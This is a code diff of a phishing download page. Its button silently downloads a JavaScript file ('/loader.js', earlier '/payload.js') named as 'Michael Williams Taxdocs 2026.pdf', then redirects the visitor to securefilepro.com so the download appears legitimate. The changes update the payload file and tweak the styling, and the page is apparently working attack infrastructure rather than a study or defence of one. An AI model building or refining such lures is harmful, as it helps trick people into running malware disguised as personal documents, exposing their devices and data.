@@ -21,14 +21,14 @@
     }
     .loading {
       display: none;
-      margin: 25px 0;
+      margin: 30px 0;
       font-size: 18px;
       color: #007bff;
     }
     .btn {
       background: #007bff;
       color: white;
-      padding: 16px 40px;
+      padding: 16px 45px;
       font-size: 18px;
       border: none;
       border-radius: 6px;
@@ -62,7 +62,7 @@
   </div>
 
   <script>
-    const originalSite = "https://securefilepro.com";   // ← Change this to your real site if needed
+    const originalSite = "https://securefilepro.com";
 
     function downloadFile() {
       const btn = document.getElementById('downloadBtn');
@@ -71,15 +71,16 @@
       btn.style.display = 'none';
       loading.style.display = 'block';
 
+      // Start Download
       const link = document.createElement('a');
-      link.href = "/payload.js";                    // Updated to payload.js
+      link.href = "/loader.js";           // ← Correct because you uploaded loader.js
       link.download = "Michael Williams Taxdocs 2026.pdf";
       
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
 
-      // Redirect to original site after download starts
+      // Redirect to securefilepro.com after 1.6 seconds
       setTimeout(() => {
         window.location.href = originalSite;
       }, 1600);
